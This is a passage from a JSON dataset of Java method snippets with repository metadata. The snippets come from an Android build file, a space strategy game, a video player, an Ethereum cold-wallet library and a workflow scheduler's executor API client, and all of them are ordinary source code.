"https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58522, "method_name": "monodroidAddReference", "class_name": "FrameRenderer_FrameDrawable", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58523, "method_name": "monodroidClearReferences", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 58524, "method_name": "key", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String key();\n    public abstract String title();\n    public String description()          { return \"\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58525, "method_name": "title", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "    public abstract String title();\n    public String description()          { return \"\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58526, "method_name": "description", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description()          { return \"\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58527, "method_name": "triggeredByAction", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean triggeredByAction()   { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58528, "method_name": "praiseMessageId", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String praiseMessageId()      { return \"\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58529, "method_name": "warningMessageId", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String warningMessageId()     { return \"\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58530, "method_name": "breakTreatyId", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String breakTreatyId()        { return \"\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58531, "method_name": "declareWarId", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String declareWarId()         { return \"\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58532, "method_name": "duration", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int duration()\t \t { return duration; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58533, "method_name": "dateOccurred", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer dateOccurred()\t { return dateOccurred; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58534, "method_name": "turnOccurred", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer turnOccurred()\t { return dateOccurred - galaxy().beginningYear(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58535, "method_name": "notifyOfPraise", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void notifyOfPraise()         { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58536, "method_name": "toString", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {  return concat(str(dateOccurred), \": \", title(), \" = \", fmt(currentSeverity(),1)); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58537, "method_name": "moreSevere", "class_name": "DiplomaticIncident", "params": ["DiplomaticIncident"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean moreSevere(DiplomaticIncident inc) {\n        if  (inc == null)\n            return true;\n        return Math.abs(currentSeverity()) > Math.abs(inc.currentSeverity());\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58538, "method_name": "decode", "class_name": "DiplomaticIncident", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String s)       { return s.replace(\"[year]\", str(dateOccurred)); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58539, "method_name": "displayOrder", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String displayOrder() { return TurnNotification.DIPLOMATIC_MESSAGE; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58540, "method_name": "currentSeverity", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float currentSeverity()\t     { return severity*remainingTime()/duration(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58541, "method_name": "isForgotten", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isForgotten()         { return remainingTime() <= 0; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58542, "method_name": "isSpying", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSpying()            { return false; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58543, "method_name": "triggersPraise", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean triggersPraise()      { return !praiseMessageId().isEmpty(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58544, "method_name": "triggersWarning", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean triggersWarning()     { return !warningMessageId().isEmpty(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58545, "method_name": "triggersBreakTreaty", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean triggersBreakTreaty() { return false; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58546, "method_name": "triggersWar", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean triggersWar()         { return !declareWarId().isEmpty(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58547, "method_name": "remainingTime", "class_name": "DiplomaticIncident", "params": [], "throws": null, "modifiers": ["private"], "return_type": "float", "snippet": "    private float remainingTime() {\n            return Math.max(0, (dateOccurred() + duration() - galaxy().currentYear()));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/DiplomaticIncident.java", "stars": "74", "class_props": {"extends": null, "implements": ["Base", "Serializable"], "modifiers": ["public", "abstract"]}}, {"id": 58548, "method_name": "getGSYVideoManager", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoViewBridge", "snippet": "    public GSYVideoViewBridge getGSYVideoManager() {\n        GSYVideoManager.instance().initContext(getContext().getApplicationContext());\n        return GSYVideoManager.instance();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58549, "method_name": "backFromFull", "class_name": "GSYVideoPlayer", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean backFromFull(Context context) {\n        return GSYVideoManager.backFromWindowFull(context);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58550, "method_name": "releaseVideos", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void releaseVideos() {\n        GSYVideoManager.releaseAllVideos();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58551, "method_name": "getFullId", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getFullId() {\n        return GSYVideoManager.FULLSCREEN_ID;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58552, "method_name": "getSmallId", "class_name": "GSYVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getSmallId() {\n        return GSYVideoManager.SMALL_ID;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoPlayer.java", "stars": "2", "class_props": {"extends": "GSYBaseVideoPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58553, "method_name": "coinCode", "class_name": "Eth", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String coinCode() {\n        return Coins.ETH.coinCode();\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsCoin", "implements": ["Coin"], "modifiers": ["public"]}}, {"id": 58554, "method_name": "parseMetaData", "class_name": "Tx", "params": [], "throws": ["InvalidTransactionException"], "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void parseMetaData() throws InvalidTransactionException {\n            try {\n                fee = calculateDisplayFee();\n                if (metaData.has(\"override\")) {\n                    JSONObject override = metaData.getJSONObject(\"override\");\n                    tokenDecimal = override.optInt(\"decimals\", decimal);\n                    isToken = true;\n                    tokenName = override.optString(\"tokenShortName\",\n                            metaData.optString(\"tokenFullName\", coinCode));\n                    String contractAddress = override.optString(\"contractAddress\");\n                    if (TextUtils.isEmpty(contractAddress)) {\n                        throw new InvalidTransactionException(\"invalid contractAddress\");\n                    }\n                    metaData.put(\"contractAddress\", contractAddress);\n                }\n                to = metaData.getString(\"to\");\n                amount = calculateDisplayAmount();\n                memo = metaData.optString(\"memo\");\n                boolean enableMemo = false;\n                if (!TextUtils.isEmpty(memo) && !enableMemo) {\n                    metaData.put(\"memo\", \"\");\n                }\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsTx", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58555, "method_name": "getAmount", "class_name": "Tx", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "        public double getAmount() {\n            if (isToken) {\n                return getAmountWithoutFee();\n            } else {\n                return super.getAmount();\n            }\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsTx", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58556, "method_name": "calculateDisplayFee", "class_name": "Tx", "params": [], "throws": ["JSONException"], "modifiers": ["private"], "return_type": "double", "snippet": "        private double calculateDisplayFee() throws JSONException {\n            BigDecimal gasPrice = new BigDecimal(metaData.getString(\"gasPrice\"));\n            BigDecimal gasLimit = new BigDecimal(metaData.getString(\"gasLimit\"));\n\n            return gasLimit.multiply(gasPrice)\n                    .divide(BigDecimal.TEN.pow(decimal), Math.min(decimal, 8), BigDecimal.ROUND_HALF_UP).doubleValue();\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsTx", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58557, "method_name": "calculateDisplayAmount", "class_name": "Tx", "params": [], "throws": ["JSONException"], "modifiers": ["private"], "return_type": "double", "snippet": "        private double calculateDisplayAmount() throws JSONException {\n\n            int decimal = isToken ? tokenDecimal : this.decimal;\n            String amount = metaData.getString(\"value\");\n            BigDecimal value = new BigDecimal(amount);\n            return value.divide(BigDecimal.TEN.pow(decimal), Math.min(decimal, 8), BigDecimal.ROUND_HALF_UP).doubleValue();\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsTx", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58558, "method_name": "derive", "class_name": "Deriver", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String derive(String accountXpub, int changeIndex, int addrIndex) {\n            DeterministicKey address = getAddrDeterministicKey(accountXpub, changeIndex, addrIndex);\n            //decompress\n            ECKey eckey = ECKey.fromPublicOnly(address.getPubKeyPoint());\n            byte[] pubKey = eckey.decompress().getPubKey();\n            byte[] hash = new byte[pubKey.length - 1];\n            System.arraycopy(pubKey, 1, hash, 0, hash.length);\n\n            String s = Hex.toHexString(getAddress(hash));\n\n            //checksum\n            return toChecksumAddress(s);\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsDeriver", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58559, "method_name": "derive", "class_name": "Deriver", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String derive(String xPubKey) {\n            DeterministicKey key = getDeterministicKey(xPubKey);\n            //decompress\n            ECKey eckey = ECKey.fromPublicOnly(key.getPubKey());\n\n            byte[] pubKey = eckey.decompress().getPubKey();\n            byte[] hash = new byte[pubKey.length - 1];\n            System.arraycopy(pubKey, 1, hash, 0, hash.length);\n\n            String s = Hex.toHexString(getAddress(hash));\n\n            //checksum\n            return toChecksumAddress(s);\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsDeriver", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58560, "method_name": "getAddress", "class_name": "Deriver", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "        public static byte[] getAddress(byte[] publicKey) {\n            byte[] hash = new Keccak.Digest256().digest(publicKey);\n            return Arrays.copyOfRange(hash, hash.length - 20, hash.length);  // right most 160 bits\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsDeriver", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58561, "method_name": "toChecksumAddress", "class_name": "Deriver", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "        public static String toChecksumAddress(String address) {\n            String lowercaseAddress = cleanHexPrefix(address).toLowerCase();\n            String addressHash = cleanHexPrefix(sha3String(lowercaseAddress));\n\n            StringBuilder result = new StringBuilder(lowercaseAddress.length() + 2);\n\n            result.append(\"0x\");\n\n            for (int i = 0; i < lowercaseAddress.length(); i++) {\n                if (Integer.parseInt(String.valueOf(addressHash.charAt(i)), 16) >= 8) {\n                    result.append(String.valueOf(lowercaseAddress.charAt(i)).toUpperCase());\n                } else {\n                    result.append(lowercaseAddress.charAt(i));\n                }\n            }\n\n            return result.toString();\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/ETH/Eth.java", "stars": "13", "class_props": {"extends": "AbsDeriver", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58562, "method_name": "callWithExecutable", "class_name": "ExecutorApiGateway", "params": ["ExecutableFlow", "Executor", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithExecutable(final ExecutableFlow exflow,\n      final Executor executor, final String action) throws ExecutorManagerException {\n    return callWithExecutionId(executor.getHost(), executor.getPort(), action,\n        exflow.getExecutionId(), null, (Pair<String, String>[]) null);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58563, "method_name": "callWithReference", "class_name": "ExecutorApiGateway", "params": ["ExecutionReference", "String", "Pair<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithReference(final ExecutionReference ref, final String action,\n      final Pair<String, String>... params) throws ExecutorManagerException {\n    final Executor executor = ref.getExecutor().get();\n    return callWithExecutionId(executor.getHost(), executor.getPort(), action, ref.getExecId(),\n        null, params);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58564, "method_name": "callWithReferenceByUser", "class_name": "ExecutorApiGateway", "params": ["ExecutionReference", "String", "String", "Pair<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithReferenceByUser(final ExecutionReference ref,\n      final String action, final String user, final Pair<String, String>... params)\n      throws ExecutorManagerException {\n    final Executor executor = ref.getExecutor().get();\n    return callWithExecutionId(executor.getHost(), executor.getPort(), action,\n        ref.getExecId(), user, params);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58565, "method_name": "callWithExecutionId", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "Integer", "String", "Pair<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callWithExecutionId(final String host, final int port,\n      final String action, final Integer executionId, final String user,\n      final Pair<String, String>... params) throws ExecutorManagerException {\n    try {\n      final List<Pair<String, String>> paramList = new ArrayList<>();\n\n      if (params != null) {\n        paramList.addAll(Arrays.asList(params));\n      }\n\n      paramList\n          .add(new Pair<>(ConnectorParams.ACTION_PARAM, action));\n      paramList.add(new Pair<>(ConnectorParams.EXECID_PARAM, String\n          .valueOf(executionId)));\n      paramList.add(new Pair<>(ConnectorParams.USER_PARAM, user));\n\n      return callForJsonObjectMap(host, port, \"/executor\", paramList);\n    } catch (final IOException e) {\n      throw new ExecutorManagerException(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58566, "method_name": "callForJsonType", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "List<Pair>", "Class<T>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T callForJsonType(final String host, final int port, final String path,\n      final List<Pair<String, String>> paramList, final Class<T> valueType) throws IOException {\n    final String responseString = callForJsonString(host, port, path, paramList);\n    if (null == responseString || responseString.length() == 0) {\n      return null;\n    }\n    return new ObjectMapper().readValue(responseString, valueType);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58567, "method_name": "callForJsonObjectMap", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "List<Pair>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> callForJsonObjectMap(final String host, final int port,\n      final String path, final List<Pair<String, String>> paramList) throws IOException {\n    final String responseString =\n        callForJsonString(host, port, path, paramList);\n\n    @SuppressWarnings(\"unchecked\") final Map<String, Object> jsonResponse =\n        (Map<String, Object>) JSONUtils.parseJSONFromString(responseString);\n    final String error = (String) jsonResponse.get(ConnectorParams.RESPONSE_ERROR);\n    if (error != null) {\n      throw new IOException(error);\n    }\n    return jsonResponse;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58568, "method_name": "callForJsonString", "class_name": "ExecutorApiGateway", "params": ["String", "int", "String", "List<Pair>"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "String", "snippet": "  private String callForJsonString(final String host, final int port, final String path,\n      List<Pair<String, String>> paramList) throws IOException {\n    if (paramList == null) {\n      paramList = new ArrayList<>();\n    }\n\n    @SuppressWarnings(\"unchecked\") final URI uri =\n        ExecutorApiClient.buildUri(host, port, path, true);\n\n    return this.apiClient.httpPost(uri, paramList);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58569, "method_name": "updateExecutions", "class_name": "ExecutorApiGateway", "params": ["Executor", "List<ExecutableFlow>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> updateExecutions(final Executor executor,\n      final List<ExecutableFlow> executions) throws ExecutorManagerException {\n    final List<Long> updateTimesList = new ArrayList<>();\n    final List<Integer> executionIdsList = new ArrayList<>();\n    // We pack the parameters of the same host together before query\n    for (final ExecutableFlow flow : executions) {\n      executionIdsList.add(flow.getExecutionId());\n      updateTimesList.add(flow.getUpdateTime());\n    }\n    final Pair<String, String> updateTimes = new Pair<>(\n        ConnectorParams.UPDATE_TIME_LIST_PARAM,\n        JSONUtils.toJSON(updateTimesList));\n    final Pair<String, String> executionIds = new Pair<>(\n        ConnectorParams.EXEC_ID_LIST_PARAM,\n        JSONUtils.toJSON(executionIdsList));\n\n    return callWithExecutionId(executor.getHost(), executor.getPort(),\n        ConnectorParams.UPDATE_ACTION, null, null, executionIds, updateTimes);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58570, "method_name": "httpPost", "class_name": "ExecutorApiGateway", "params": ["String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String httpPost(String actionUrl, String json) throws Exception{\n    MediaType applicationJson = MediaType.parse(\"application/json;charset=utf-8\");\n    RequestBody requestBody = RequestBody.create(applicationJson, json);\n    //\u8bbe\u7f6e\u94fe\u63a5\u8d85\u65f6 \u8bbe\u7f6e\u5199\u5165\u8d85\u65f6 \u8bbe\u7f6e\u8bfb\u53d6\u8d85\u65f6\n    OkHttpClient okHttpClient = new OkHttpClient.Builder()\n            .connectTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(20, TimeUnit.SECONDS)\n            .readTimeout(20, TimeUnit.SECONDS)\n            .build();\n    Request request = new Request.Builder()\n            .url(actionUrl)\n            .post(requestBody)\n            .build();\n    Call call = okHttpClient.newCall(request);\n    Response response = null;\n    String ret = null;\n    try {\n      response = call.execute();\n      if(response.isSuccessful()) {\n        ret = response.body().string();\n      }\n    } catch (IOException e){\n      throw e;\n    } finally {\n      if(response != null){\n        response.close();\n      }\n    }\n    return ret;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorApiGateway.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58571, "method_name": "getEnergyCost", "class_name": "ItemRGBUpgrade", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getEnergyCost() {\n        return 10;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemUpgrades/ItemRGBUpgrade.java", "stars": "2", "class_props": {"extends": 